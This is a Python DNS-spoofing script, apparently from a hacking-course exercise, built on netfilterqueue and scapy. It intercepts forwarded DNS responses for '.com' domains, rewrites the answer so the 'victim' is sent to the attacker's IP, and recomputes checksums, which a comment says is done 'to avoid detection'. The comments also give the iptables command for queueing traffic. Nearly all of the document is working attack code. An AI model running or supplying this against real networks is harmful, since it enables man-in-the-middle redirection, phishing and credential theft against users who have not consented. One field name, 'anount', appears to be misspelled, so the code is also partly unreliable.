#!/usr/bin/env python

#1. apt-get install build-essential python-dev libnetfilter-queue-dev
#2. apt install python3-pip git libnfnetlink-dev libnetfilter-queue-dev
#3. pip install netfilterqueue -->  netfilterqueue lets us stack iptables
# service apache2 start
import netfilterqueue
import scapy.all as scapy
import sys

myip = sys.argv[1]

print("[+] Spoof in progress")
# change ip tables to set up queue --> iptables -I FORWARD -j NFQUEUE --queue-num 0 (use OUTPUT instead of FORWARD for local machine)
# get IP quick ip -c 1 www.google.com

def process_packet(packet):
    # print(packet)
    # packet.accept()
    # can't access layers unless we convert to scapy


    scapy_packet = scapy.IP(packet.get_payload())
    # # DNSRR:DNS Resource Record DNSQ:DNS Query
    if scapy_packet.haslayer(scapy.DNSRR):
        # print(scapy_packet.show())
        qname = scapy_packet[scapy.DNSQR].qname
        if '.com' in qname:
            print("[+] DNS request intercepted, redirecting victim to " + myip)
            # qname:query website rrname:resource record website
            # DNSQ is for query, we want DNSRR (response query is complex OSI model)
            # rdata: where are we hosting our spoof server?
            answer = scapy.DNSRR(rrname=qname, rdata=myip)
            scapy_packet[scapy.DNS].an = answer
            scapy_packet[scapy.DNS].anount = 1

            # we need to delete these values and scapy will redo them for us to avoid detection
            del scapy_packet[scapy.IP].len
            del scapy_packet[scapy.IP].chksum
            del scapy_packet[scapy.UDP].chksum
            del scapy_packet[scapy.UDP].len

            # convert from scapy packet back to original (string)
            packet.set_payload(str(scapy_packet))

    # k, it won't forward bcak to target without this .accept()
    packet.accept()

queue = netfilterqueue.NetfilterQueue()
# bind to list (queue list number and execute function)
queue.bind(0, process_packet)
queue.run()
